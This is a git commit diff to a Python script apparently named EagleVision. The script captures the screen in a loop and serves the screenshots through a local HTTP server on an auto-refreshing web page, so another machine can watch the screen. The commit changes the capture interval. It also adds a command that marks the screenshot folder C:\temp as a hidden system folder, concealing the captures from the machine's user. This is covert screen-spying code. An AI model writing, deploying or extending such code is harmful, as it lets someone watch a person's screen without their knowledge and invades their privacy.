86881fe62d51bcbd969204dca40a6b6f8bc0ff58
Ari4IV <32978451+Ari4IV@users.noreply.github.com>
2021-01-20 16:18:08 +0800

    Add files via upload

--- EagleVision.py
+++ EagleVision.py
@@ -18,7 +18,7 @@ def EagleVision():
     while 7==7:
         Vision = ImageGrab.grab()
         Vision.save('C:\\temp\\image\\EagleVision.png')
-        time.sleep(1.5)
+        time.sleep(10)
 
 if __name__ == '__main__':
     Process(target=httpserver).start()
@@ -26,3 +26,5 @@ if __name__ == '__main__':
     f = open('C:\\temp\\image\\index.html','wb')
     f.write("<title>EagleVision</title><img src='EagleVision.png' width='1280' height='720'><meta http-equiv='refresh' content='1.1'>".encode())
     f.close()
+    hidden = 'attrib +s +a +h C:\\temp'
+    os.system(hidden)
